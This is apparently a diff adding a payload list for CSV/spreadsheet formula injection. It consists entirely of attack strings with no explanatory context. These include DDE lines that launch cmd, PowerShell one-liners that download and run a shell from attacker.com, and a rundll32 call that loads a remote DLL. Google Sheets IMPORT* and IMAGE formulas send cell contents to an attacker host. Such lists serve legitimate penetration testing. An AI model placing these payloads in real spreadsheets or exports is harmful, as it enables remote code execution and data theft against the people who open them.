@@ -1,0 +1,23 @@
+DDE ("cmd";"/C calc";"!A0")A0
+@SUM(1+1)*cmd|' /C calc'!A0
+=2+5+cmd|' /C calc'!A0
+=cmd|' /C notepad'!'A1'
+=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
+=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
+=HYPERLINK("https://attacker.com/?data="&A1&B1,"Click")
+=IMPORTXML("https://attacker.com/?data="&A1,"//a")
+=IMPORTFEED("https://attacker.com/?data="&A1)
+=IMPORTHTML("https://attacker.com/?data="&A1,"table",1)
+=IMPORTRANGE("https://attacker.com/?data="&A1,"Sheet1!A1")
+=IMPORTDATA("https://attacker.com/?data="&A1)
+=IMAGE("https://attacker.com/?data="&A1)
+-2+3+cmd|' /C calc'!A0
++cmd|' /C notepad'!A0
+@cmd|' /C notepad'!A0
+\r\ncmd|' /C notepad'!A0
+%0Acmd|' /C notepad'!A0
+=cmd|'/C powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0
+=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe'!''
+=cmd|'/c ping attacker.com'!A0
+=cmd|'/c nslookup attacker.com'!A0
+=cmd|'/c curl http://attacker.com'!A0
